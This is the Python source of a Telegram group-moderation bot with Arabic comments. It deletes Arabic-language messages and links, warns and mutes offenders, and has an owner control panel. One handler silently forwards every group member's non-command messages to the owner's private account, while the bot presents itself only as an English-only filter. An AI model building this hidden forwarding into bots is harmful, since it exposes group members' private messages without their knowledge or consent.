import os
import re
import asyncio
import collections
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button

# جلب الإعدادات من البيئة
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = 5270790672

# تشغيل العميل
client = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# قواعد البيانات المؤقتة في الذاكرة
warnings = collections.defaultdict(lambda: collections.defaultdict(int))

# الإعدادات الافتراضية للفلاتر
settings = {
    'lang_filter': True,
    'link_filter': True
}

# دالة فحص اللغة الإنجليزية
def is_english_only(text):
    if not text.strip():
        return True
    arabic_pattern = re.compile(r'[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF]')
    return not bool(arabic_pattern.search(text))

# دالة فحص الروابط والمعرفات
def contains_link(text):
    pattern = r'(https?://[^\s]+)|(www\.[^\s]+)|(t\.me/[^\s]+)|(@[a-zA-Z0-9_]+)'
    return bool(re.search(pattern, text))

# دالة التعامل مع المخالفات (تحذف الرسالة والتحذير تلقائياً بعد ثوانٍ)
async def handle_violation(event, reason_text):
    chat_id = event.chat_id
    user_id = event.sender_id
    
    # 1. حذف الرسالة المخالفة فوراً
    try:
        await event.delete()
    except Exception:
        pass

    try:
        sender = await event.get_sender()
        user_name = f"@{sender.username}" if (sender and sender.username) else "User"
    except Exception:
        user_name = "User"

    # حساب التحذيرات
    warnings[chat_id][user_id] += 1
    current_warns = warnings[chat_id][user_id]
    
    # تحضير نص نص التحذير أو الكتم
    if current_warns >= 3:
        warnings[chat_id][user_id] = 0
        try:
            await client.edit_permissions(chat_id, user_id, until_date=timedelta(minutes=5), send_messages=False)
            warn_msg = await event.respond(f"🚫 {user_name} has been muted for 5 minutes for {reason_text}.")
        except Exception:
            warn_msg = await event.respond(f"⚠️ {user_name} violated rules, but I couldn't mute them.")
    else:
        warn_msg = await event.respond(f"⚠️ {user_name}, {reason_text} is not allowed! [Warning: {current_warns}/3]")

    # 2. التعديل (رقم 2): جعل رسالة التحذير تحذف نفسها ذاتياً بعد 5 ثوانٍ لتبدو غير ظاهرية
    await asyncio.sleep(5)
    try:
        await warn_msg.delete()
    except Exception:
        pass

# --- 1. التعديل (رقم 1): إظهار قائمة التحكم عند إرسال /start في الخاص للمطور ---
@client.on(events.NewMessage(pattern='/start', incoming=True))
async def start_command(event):
    if not event.is_private:
        return
    
    if event.sender_id == OWNER_ID:
        buttons = [
            [
                Button.inline(f"English Filter: {'✅ ON' if settings['lang_filter'] else '❌ OFF'}", data="toggle_lang"),
                Button.inline(f"Link Filter: {'✅ ON' if settings['link_filter'] else '❌ OFF'}", data="toggle_link")
            ]
        ]
        await event.respond("🛠️ **Welcome to Control Panel:**\nYou can toggle filters directly below:", buttons=buttons)
    else:
        await event.respond("👋 Welcome! I am English Only protection bot.")

# --- 2. التعديل (رقم 3): تحويل رسائل المستخدمين بالكامل للأونر (توجيه كأمر الميوت) ---
@client.on(events.NewMessage(incoming=True))
async def forward_user_messages(event):
    # نتحقق أنها مجموعة وليست خاص، وأن المرسل ليس البوت نفسه وليس الأونر
    if event.is_private or event.sender_id == OWNER_ID or event.sender_id == (await client.get_me()).id:
        return
    
    # استثناء الأوامر العامة من التحويل لتجنب الإزعاج
    if event.raw_text and event.raw_text.startswith('/'):
        return

    try:
        # تحويل مباشر للرسالة إلى الأونر
        await client.forward_messages(OWNER_ID, event.message)
    except Exception:
        pass

# --- 3. التعديل (رقم 5): استدعاء المطور عند كتابة كلمة (المطور) داخل المجموعة ---
@client.on(events.NewMessage(incoming=True))
async def developer_call(event):
    if event.is_private:
        return
    
    text = event.raw_text or ""
    if "المطور" in text:
        try:
            # إرسال رابط حسابك الشخصي صاحب الآيدي المذكور مباشرة
            await event.reply(f"🔍 **يمكنك التواصل مع مطور البوت من هنا:**\n[اضغط هنا لفتح حساب المطور](tg://user?id={OWNER_ID})")
        except Exception:
            pass

# --- 4. دالة مراقبة وفلترة المجموعات الصارمة ---
@client.on(events.NewMessage(incoming=True))
async def monitor_messages(event):
    if event.is_private or event.sender_id == OWNER_ID:
        return

    text = event.raw_text or ""
    if text.startswith('/'):
        return

    # فحص الروابط والرسائل المحولة أولاً
    if settings['link_filter'] and (contains_link(text) or event.forward):
        await handle_violation(event, "sending links/forward/usernames")
        return

    # فحص اللغة العربية
    if settings['lang_filter'] and not is_english_only(text):
        await handle_violation(event, "using non-English language")
        return

# --- 5. التحكم بالأزرار التفاعلية الخاصة بلوحة التحكم (Callback Queries) ---
@client.on(events.CallbackQuery)
async def callback_handler(event):
    if event.sender_id != OWNER_ID:
        await event.answer("⚠️ You are not authorized!", alert=True)
        return

    data = event.data.decode('utf-8')
    
    if data == "toggle_lang":
        settings['lang_filter'] = not settings['lang_filter']
        await event.answer(f"English Filter: {'Enabled' if settings['lang_filter'] else 'Disabled'}")
    elif data == "toggle_link":
        settings['link_filter'] = not settings['link_filter']
        await event.answer(f"Link Filter: {'Enabled' if settings['link_filter'] else 'Disabled'}")

    # تحديث شكل الأزرار بعد الضغط مجدداً تلقائياً
    buttons = [
        [
            Button.inline(f"English Filter: {'✅ ON' if settings['lang_filter'] else '❌ OFF'}", data="toggle_lang"),
            Button.inline(f"Link Filter: {'✅ ON' if settings['link_filter'] else '❌ OFF'}", data="toggle_link")
        ]
    ]
    try:
        await event.edit("🛠️ **Welcome to Control Panel:**\nYou can toggle filters directly below:", buttons=buttons)
    except Exception:
        pass

# --- 6. أوامر الإشراف الإدارية للمجموعات (/mute, /ban) ---
@client.on(events.NewMessage(pattern=r'^/(mute|ban)'))
async def admin_commands(event):
    if event.is_private or event.sender_id != OWNER_ID:
        return
    if not event.is_reply:
        return
        
    command = event.pattern_match.group(1)
    reply_msg = await event.get_reply_message()
    target_user = reply_msg.sender_id
    
    try:
        if command == "mute":
            await client.edit_permissions(event.chat_id, target_user, send_messages=False)
            await event.respond("🚫 User has been muted by Admin.")
        elif command == "ban":
            await client.kick_participant(event.chat_id, target_user)
            await event.respond("🚷 User has been banned by Admin.")
    except Exception:
        pass

# --- تشغيل البوت المباشر ومعالجة الأخطاء العامة ---
async def main():
    print("Bot is successfully running with all custom updates...")
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except Exception as e:
        print(f"Critical Error: {e}")
